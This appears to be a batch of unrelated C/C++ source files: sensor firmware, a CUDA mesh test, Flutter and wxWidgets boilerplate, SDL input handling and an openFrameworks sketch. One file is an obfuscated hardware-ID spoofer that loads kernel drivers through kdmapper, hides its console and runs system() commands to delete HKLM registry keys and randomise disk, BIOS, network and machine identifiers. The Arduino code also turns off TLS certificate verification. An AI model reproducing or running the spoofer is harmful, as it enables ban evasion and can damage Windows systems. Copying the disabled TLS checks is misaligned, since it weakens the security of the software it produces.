Serial.begin(9600);                                     // Device to serial monitor feedback\n\n    mySerial.begin(BAUDRATE);                               \n    myMHZ19.begin(mySerial);                                // *Serial(Stream) refence must be passed to library begin(). \n    myMHZ19.autoCalibration();                              // Turn auto calibration ON (OFF autoCalibration(false))\n\n    WiFi.mode(WIFI_STA);\n    WiFi.begin(ssid, password);\n    while (WiFi.status() != WL_CONNECTED) {\n      Serial.print('.');\n      delay(1000);\n    }\n    Serial.println(WiFi.localIP());\n    client.setInsecure();\n}\n\nvoid sendData(String data) {\n  HTTPClient http;\n  http.begin(client, api_url);\n  http.addHeader(\"Content-Type\", \"application/json;charset=UTF-8\");\n  http.addHeader(\"Authorization\", token);\n  int httpCode = http.POST(data);\n  if (httpCode != 200 && httpCode > 0 ) {\n      String payload = http.getString();\n      Serial.println(httpCode);\n      Serial.println(payload);\n  }\n  else {\n      Serial.println(http.errorToString(httpCode).c_str());\n  }\n  http.end();\n}\n\nvoid loop()\n{\n    if (millis() - getDataTimer >= 61000)\n    {\n        JsonDocument  doc;\n        String        data;\n        \n        doc[\"co2\"] = myMHZ19.getCO2();\n        doc[\"temperature\"] = (int)myMHZ19.getTemperature();\n        doc[\"startup_time\"] = millis() / 1000;\n        serializeJson(doc, data);\n        if (WiFi.status() == WL_CONNECTED)\n        {\n          // if (offlineData.size() > 0) {\n          //   for (auto& d : offlineData) {\n          //     sleep(0.1);\n          //     sendData(d);\n          //   }\n          //   offlineData.clear();\n          // }\n          // Send the current data\n          sendData(data);\n        } else {\n            // If WiFi is not connected, store the data for later\n            // if (offlineData.size() > 800) {\n            //   offlineData.erase(offlineData.begin());\n            // }\n            offlineData.push_back(data);\n            WiFi.begin(ssid, password);\n        }\n    }\n}",
    "// 240306 - do \n// Test code for parallel vertex deduplication\n\n#include <string>\n#include <iostream>\n#include <chrono>\n#include <limits.h>\n#include <unistd.h>\n#include <signal.h>\n#include \"kernel.cuh\"\n#include \"../include/host_deduplication.hpp\"\n\n\nbool validation = false;\n\nstruct mesh_t\n{\n  int num_vertices;\n  int num_triangles;\n  float3* vertices;\n  uint3* triangles;\n};\n\n\nvoid ctrlc_handler(int s)\n{\n  // std::cout << \"\\n[signal] value : \" << s << \", key : Ctrl + C\" <<std::endl;\n  ExitCUDA();\n  std::cout << \"\\nProgram Terminated.\" << std::endl;\n  exit(1);\n}\n\n/**\n * @brief Read mesh data from file and store it in a mesh_t struct and vectors for validation\n * \n * @param filename mesh file name to read\n * @param vertices vector to store vertices, for validation\n * @param faces vector to store faces, for validation\n * @return mesh_t \n */\nmesh_t read_mesh(const std::string& filename, std::vector<float3> &vertices, std::vector<uint3> &faces)\n{\n  std::cout<< \"Reading mesh data from file: \" << filename << std::endl;\n  auto start = std::chrono::system_clock::now();\n  FILE* fp = fopen(filename.c_str(), \"r\");\n  \n  if (fp == NULL)\n  {\n    printf(\"Error: file not found\\n\");\n    exit(-1);\n  }\n  \n  int num_vertices, num_triangles;\n  fscanf(fp, \"%d %d\\n\", &num_vertices, &num_triangles);\n  \n  mesh_t mesh;\n  mesh.num_vertices = num_vertices;\n  mesh.num_triangles = num_triangles;\n  std::cout << \"[Input Data] Vertices: \" << num_vertices << \", Triangles: \" << num_triangles << std::endl;\n\n  mesh.vertices = new float3[num_vertices];\n  mesh.triangles = new uint3[num_triangles];\n\n\n  vertices.reserve(num_vertices);\n  faces.reserve(num_triangles);\n\n  for(int i = 0; i < num_vertices; i++)\n  {\n    float x, y, z;\n    fscanf(fp, \"v %f %f %f\\n\", &x, &y, &z);\n\n    float3 vertex {x, y, z};\n    mesh.vertices[i] = vertex;\n    vertices.push_back(vertex);\n  }\n  for(int i = 0; i < num_triangles; i++)\n  {\n    uint v0, v1, v2;\n    fscanf(fp, \"f %u %u %u\\n\", &v0, &v1, &v2);\n\n    uint3 face {v0, v1, v2};\n    mesh.triangles[i] = face;\n    faces.push_back(face);\n  }\n\n  fclose(fp);\n  auto end = std::chrono::system_clock::now();\n  std::chrono::duration<double> elapsed_seconds = end-start;\n\n  std::cout<< \"Done. << \" << elapsed_seconds.count()*1000 << \"ms\"<< std::endl;\n  return mesh;\n}\n\n\nvoid write_mesh(const std::string& filename, mesh_t input_mesh, thrust::host_vector<float3>& out_verts, thrust::host_vector<int4>& half_edges)\n{\n  std::cout<< \"Writing output data to file: \" << filename << std::endl;\n  FILE* fp = fopen(filename.c_str(), \"w\");\n  if (fp == NULL)\n  {\n    printf(\"Error: file not found\\n\");\n    exit(-1);\n  }\n\n  size_t out_num_verts = out_verts.size();\n  \n  fprintf(fp, \"%d %d\\n\", out_num_verts, input_mesh.num_triangles*3);\n  for(int i = 0; i < out_num_verts; i++)\n  {\n    fprintf(fp, \"%f %f %f\\n\", out_verts[i].x, out_verts[i].y, out_verts[i].z);\n  }\n  \n  // write half edges\n  for(int i = 0; i < input_mesh.num_triangles*3; i++)\n  {\n    fprintf(fp, \"%d %d %d %d\\n\", half_edges[i].x, half_edges[i].y, half_edges[i].z, half_edges[i].w);\n  }\n\n\n  fclose(fp);\n  std::cout<< \"Done.\" << std::endl;\n  std::cout<< \"[ RESULT ]\" << std::endl;\n  std::cout<< \"- INPUT  | Vertices: \" << input_mesh.num_vertices << \", Triangles: \" << input_mesh.num_triangles << std::endl;\n  std::cout<< \"- OUTPUT | Vertices: \" << out_num_verts << \", Half-edges: \" << input_mesh.num_triangles*3 << std::endl;\n}\n\n\nint main()\n{\n  signal(SIGINT, ctrlc_handler);\n\n  std::vector<float3> vertices;\n  std::vector<uint3> faces;\n\n  InitCUDA();\n\n  std::string filename = \"/home/do/Desktop/do_code/mesh_deduplicator_cuda/data/sample_mesh_data2.txt\";\n  mesh_t mesh = read_mesh(filename, vertices, faces);\n\n  // auto start = std::chrono::system_clock::now();\n  // Copy mesh data from Host to device\n  meshcopyHtoD(mesh.num_vertices,mesh.num_triangles,mesh.vertices,mesh.triangles);\n  // auto chk1 = std::chrono::system_clock::now();\n\n\n  // Deduplicate vertices\n  size_t out_num_vertices = deduplicateAndGenerateHalfedges();\n  printf(\"out_num_vertices: %d\\n\", out_num_vertices);\n  thrust::host_vector<float3> out_vertices(out_num_vertices);\n  thrust::host_vector<int4> half_edges(mesh.num_triangles*3);\n\n  // auto chk2 = std::chrono::system_clock::now();\n  meshcopyDtoH(out_vertices,half_edges);\n  // auto end = std::chrono::system_clock::now();\n\n\n  // std::chrono::duration<double> elapsed_seconds1 = chk1-start;\n  // std::chrono::duration<double> elapsed_seconds2 = chk2-chk1;\n  // std::chrono::duration<double> elapsed_seconds3 = end-chk2;\n  // std::chrono::duration<double> elapsed_seconds = end-start;\n  // std::cout<< \"Deduplication and Half-edges Generation Time: \" << elapsed_seconds1.count()*1000 << \"ms\" << std::endl;\n  // std::cout<< \"Copy HtoD Time: \" << elapsed_seconds2.count()*1000 << \"ms\" << std::endl;\n  // std::cout<< \"Copy DtoH Time: \" << elapsed_seconds3.count()*1000 << \"ms\" << std::endl;\n  // std::cout<< \"Total Time: \" << elapsed_seconds.count()*1000 << \"ms\" << std::endl;\n\n\n  // write_mesh(\"/home/do/Desktop/",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"to_do_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//StHomeLess#2465\r\n#pragma once\r\n#include <iostream>\r\n#include <urlmon.h>\r\n\r\n#include \"xhackorx.hpp\"\r\n#include \"mac.h\"\r\n#include \"kdmapper.hpp\"\r\n#include \"driver.h\"\r\n\r\n#pragma comment(lib, \"urlmon.lib\")\r\n#define _CRT_SECURE_NO_WARNINGS\r\n#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))\r\n#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))\r\n\r\n//---------------UTILS--------------//\r\n\r\nusing namespace std;\r\nvoid HideConsole()\r\n{\r\n\t::ShowWindow(::GetConsoleWindow(), SW_HIDE);\r\n}\r\n\r\nvoid ShowConsole()\r\n{\r\n\t::ShowWindow(::GetConsoleWindow(), SW_SHOW);\r\n}\r\n\r\n//---------------REGS--------------//\r\n\r\nint regedit()\r\n{\r\n\tHideConsole();\r\n\tsystem(XorString(\"reg delete HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\TimeZoneInformation /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SOFTWARE\\Microsoft\\\\Windows\\\" \\\"NT\\\\CurrentVersion\\\\Notifications\\\\Data /v 418A073AA3BC3475 /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f\"));\r\n\tsystem(XorString(\"reg delete HKLM\\\\HARDWARE\\\\DESCRIPTION\\\\System\\\\CentralProcessor\\\\0 /f\") );\r\n\tsystem(XorString(\"REG ADD HKCU\\\\Software\\\\Microsoft\\\\Direct3D /v WHQLClass /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\ComputerName\\\\ComputerName /v ComputerName /t REG_SZ /d DESKTOP-%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\ComputerName\\\\ActiveComputerName /v ComputerName /t REG_SZ /d DESKTOP-%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WindowsUpdate /v SusClientId /t REG_SZ /d %random%%random%-%random%-%random%-%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\HardwareConfig /v LastConfig /t REG_SZ /d {%random%-%random%-%random} /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\HardwareConfig\\\\Current /v BaseBoardProduct /t REG_SZ /d %random%-%random%%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\Software\\\\Microsoft /v BuildLab /t REG_SZ /d %random%-%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\Software\\\\Microsoft /v BuildLabEx /t REG_SZ /d %random%-%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\HARDWARE\\\\DESCRIPTION\\\\System\\\\BIOS /v BaseBoardProduct /t REG_SZ /d %random%-%random%%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\ControlSet001\\\\Services\\\\kbdclass\\\\Parameters /v WppRecorder_TraceGuid /t REG_SZ /d {%random%-%random%-%random%-%random%%random%} /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\ControlSet001\\\\Services\\\\mouhid\\\\Parameters /v WppRecorder_TraceGuid /t REG_SZ /d {%random%-%random%-%random%-%random%%random%} /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Class\\\\{4d36e968-e325-11ce-bfc1-08002be10318}\\\\0000 /v UserModeDriverGUID /t REG_SZ /d {%random%-%random%-%random%-%random%%random%} /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\" \\\"NT\\\\CurrentVersion /v BuildBranch /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\" \\\"NT\\\\CurrentVersion /v BuildGUID /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\" \\\"NT\\\\CurrentVersion /v BuildLab /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\HARDWARE\\\\DEVICEMAP\\\\Scsi\\\\Scsi\\\" \\\"Port\\\" \\\"0\\\\Scsi\\\" \\\"Bus\\\" \\\"0\\\\Target\\\" \\\"Id\\\" \\\"0\\\\Logical\\\" \\\"Unit\\\" \\\"Id\\\" \\\"0 /v Identifier /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\HARDWARE\\\\DEVICEMAP\\\\Scsi\\\\Scsi\\\" \\\"Port\\\" \\\"1\\\\Scsi\\\" \\\"Bus\\\" \\\"0\\\\Target\\\" \\\"Id\\\" \\\"0\\\\Logical\\\" \\\"Unit\\\" \\\"Id\\\" \\\"0 /v Identifier /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\HARDWARE\\\\DESCRIPTION\\\\System\\\\MultifunctionAdapter\\\\0\\\\DiskController\\\\0\\\\DiskPeripheral\\\\0 /v Identifier /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\HARDWARE\\\\DESCRIPTION\\\\System\\\\MultifunctionAdapter\\\\0\\\\DiskController\\\\0\\\\DiskPeripheral\\\\1 /v Identifier /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\ControlSet001\\\\Services\\\\BasicDisplay\\\\Video /v VideoID /t REG_SZ /d {%random%-%random%-%random%-%random%%random%} /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\SQMClient /v MachineId /t REG_SZ /d {%random%-%random%-%random%-%random%%random%} /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Parameters /v Hostname /t REG_SZ /d DESKTOP-%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Parameters /v Domain /t REG_SZ /d %random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\DevQuery\\\\6 /v UUID /t R",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "// wxWidgets \"Hello World\" Program available on https://docs.wxwidgets.org/trunk/overview_helloworld.html\r\n\r\n// For compilers that support precompilation, includes \"wx/wx.h\".\r\n#include <wx/wxprec.h>\r\n#ifndef WX_PRECOMP\r\n    #include <wx/wx.h>\r\n#endif\r\n\r\nclass MyApp : public wxApp \r\n{\r\npublic:\r\n    virtual bool OnInit(); \r\n}; \r\n\r\nclass MyFrame : public wxFrame\r\n{\r\npublic:\r\n    MyFrame();\r\nprivate:\r\n    void OnHello(wxCommandEvent& event);\r\n    void OnExit(wxCommandEvent& event);\r\n    void OnAbout(wxCommandEvent& event);\r\n};\r\n\r\nenum\r\n{\r\n    ID_Hello = 1\r\n};\r\n\r\nwxIMPLEMENT_APP(MyApp);\r\n\r\nbool MyApp::OnInit()\r\n{\r\n    MyFrame *frame = new MyFrame();\r\n    frame->Show(true);\r\n    return true;\r\n}\r\n\r\nMyFrame::MyFrame() : wxFrame(NULL, wxID_ANY, \"Hello World\")\r\n{\r\n    wxMenu *menuFile = new wxMenu;\r\n    menuFile->Append(ID_Hello, \"&Hello...\\tCtrl-H\", \"Help string shown in status bar for this menu item\");\r\n    menuFile->AppendSeparator();\r\n    menuFile->Append(wxID_EXIT);\r\n\r\n    wxMenu *menuHelp = new wxMenu;\r\n    menuHelp->Append(wxID_ABOUT);\r\n\r\n    wxMenuBar *menuBar = new wxMenuBar;\r\n    menuBar->Append(menuFile, \"&File\");\r\n    menuBar->Append(menuHelp, \"&Help\");\r\n    SetMenuBar( menuBar );\r\n\r\n    CreateStatusBar();\r\n\r\n    SetStatusText(\"Welcome to wxWidgets!\");\r\n\r\n    Bind(wxEVT_MENU, &MyFrame::OnHello, this, ID_Hello);\r\n    Bind(wxEVT_MENU, &MyFrame::OnAbout, this, wxID_ABOUT);\r\n    Bind(wxEVT_MENU, &MyFrame::OnExit, this, wxID_EXIT);\r\n}\r\n\r\nvoid MyFrame::OnExit(wxCommandEvent& event)\r\n{\r\n    Close(true);\r\n}\r\n\r\nvoid MyFrame::OnAbout(wxCommandEvent& event)\r\n{\r\n    wxMessageBox(\"This is a wxWidgets Hello World example\", \"About Hello World\", wxOK | wxICON_INFORMATION);\r\n}\r\n\r\nvoid MyFrame::OnHello(wxCommandEvent& event)\r\n{\r\n    wxLogMessage(\"Hello world from wxWidgets!\");\r\n}\r\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "\n#include \"InputController.h\"\n#include \"SDL.h\"\n#include \"GameController.h\"\n\nInputController::InputController():mQuit(nullptr), mnoptrCurrentController(nullptr)\n{\n\n}\n\nvoid InputController::Init(InputAction quitAction)\n{\n\tmQuit = quitAction;\n}\n\nvoid InputController::Update(uint32_t dt)\n{\n\tSDL_Event sdlEvent;\n\n\twhile(SDL_PollEvent(&sdlEvent))\n\t{\n\t\tswitch(sdlEvent.type)\n\t\t{\n\t\tcase SDL_QUIT:\n\t\t{\n\t\t\tmQuit(dt, SDL_PRESSED);\n\t\t}\n\t\tbreak;\n\t\tcase SDL_MOUSEMOTION:\n\t\t{\n\t\t\tif(mnoptrCurrentController)\n\t\t\t{\n\t\t\t\tif(MouseMovedAction mouseMoved = mnoptrCurrentController->GetMouseMovedAction())\n\t\t\t\t{\n\t\t\t\t\tMousePosition position;\n\t\t\t\t\tposition.xPos = sdlEvent.motion.x;\n\t\t\t\t\tposition.yPos = sdlEvent.motion.y;\n\t\t\t\t\tmouseMoved(position);\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t\tcase SDL_MOUSEBUTTONUP:\n\t\tcase SDL_MOUSEBUTTONDOWN:\n\t\t\tif(mnoptrCurrentController)\n\t\t\t{\n\t\t\t\tMouseInputAction action = mnoptrCurrentController->GetMouseButtonActionForMouseButton(static_cast<MouseButton>(sdlEvent.button.button));\n\n\t\t\t\tMousePosition position;\n\t\t\t\tposition.xPos = sdlEvent.button.x;\n\t\t\t\tposition.yPos = sdlEvent.button.y;\n\n\t\t\t\taction(static_cast<InputState>(sdlEvent.button.state), position);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase SDL_KEYDOWN:\n\t\tcase SDL_KEYUP:\n\n\t\t\tif(mnoptrCurrentController)\n\t\t\t{\n\t\t\t\tInputAction action = mnoptrCurrentController->GetActionForKey(sdlEvent.key.keysym.sym);\n\n\t\t\t\taction(dt, static_cast<InputState>(sdlEvent.key.state));\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t}\n}\n\nvoid InputController::SetGameController(GameController* controller)\n{\n\tmnoptrCurrentController = controller;\n}\n",
    "#include \"ofApp.h\"\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::setup() {\r\n\r\n\tofSetFrameRate(25);\r\n\tofSetWindowTitle(\"openFrameworks\");\r\n\r\n\tofBackground(39);\r\n\tofNoFill();\r\n\tofEnableDepthTest();\r\n\r\n\tofColor color;\r\n\tthis->number_of_sphere = 70;\r\n\twhile (this->box_list.size() < this->number_of_sphere) {\r\n\r\n\t\tauto tmp_location = this->make_point(280, ofRandom(0, 50), ofRandom(360), ofRandom(360));\r\n\t\tauto radius = this->box_list.size() < 50 ? ofRandom(20, 60) : ofRandom(10, 20);\r\n\r\n\t\tbool flag = true;\r\n\t\tfor (int i = 0; i < this->box_list.size(); i++) {\r\n\r\n\t\t\tif (glm::distance(tmp_location, get<1>(this->box_list[i])) < get<2>(this->box_list[i]) + radius) {\r\n\r\n\t\t\t\tflag = false;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif (flag) {\r\n\r\n\t\t\tcolor.setHsb(ofRandom(255), 255, 200);\r\n\t\t\tthis->box_list.push_back(make_tuple(color, tmp_location, radius));\r\n\t\t}\r\n\t}\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::update() 